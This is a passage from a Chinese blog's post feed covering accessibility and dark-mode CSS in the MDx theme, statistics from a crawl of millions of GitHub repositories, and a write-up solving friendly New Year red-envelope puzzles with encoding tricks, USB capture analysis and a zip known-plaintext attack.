}\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 